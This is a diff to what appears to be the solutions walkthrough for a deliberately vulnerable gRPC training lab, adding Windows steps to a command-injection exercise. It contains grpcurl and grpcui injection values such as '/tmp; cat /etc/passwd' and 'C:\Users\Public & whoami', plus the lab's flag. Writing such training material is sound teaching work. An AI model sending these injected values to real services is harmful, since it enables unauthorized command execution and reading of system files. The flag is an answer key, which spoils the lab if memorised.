@@ -94,9 +94,9 @@ grpcurl -d '{"username": "flag_user"}' <HOST> lab007userdirectory.UserDirectory/
 
 ## Lab 008 — Command Injection
 
-**Vulnerability**: The `directory` parameter is passed directly to `sh -c "ls -la <input>"`, allowing arbitrary command execution.
+**Vulnerability**: The `directory` parameter is passed directly to the system shell (`sh -c` on Linux, `cmd /C` on Windows), allowing arbitrary command injection.
 
-### grpcurl
+### grpcurl — Linux / Cloud Run
 
 ```bash
 # Normal usage
@@ -112,11 +112,21 @@ grpcurl -d '{"directory": "/tmp; cat /etc/passwd"}' <HOST> lab008fileprocessor.F
 grpcurl -d '{"directory": "/tmp; cat /flag.txt"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
 ```
 
+### grpcurl — Windows (local)
+
+```powershell
+# Normal usage
+grpcurl -plaintext -d '{"directory": "C:\\Users\\Public"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
+
+# Inject a second command
+grpcurl -plaintext -d '{"directory": "C:\\Users\\Public & whoami"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
+```
+
 ### grpcui
 
 1. Connect: `grpcui <HOST>`
 2. Select service: `lab008fileprocessor.FileProcessor`, method: `ListFiles`
-3. Set `directory` to `/tmp; cat /etc/passwd`
+3. Linux: set `directory` to `/tmp; id` — Windows: set `directory` to `C:\Users\Public & whoami`
 4. Click **Invoke** — the injected command output appears in `output`
 
 **Flag**: `GRPC_GOAT{command_injection_file_listing}`
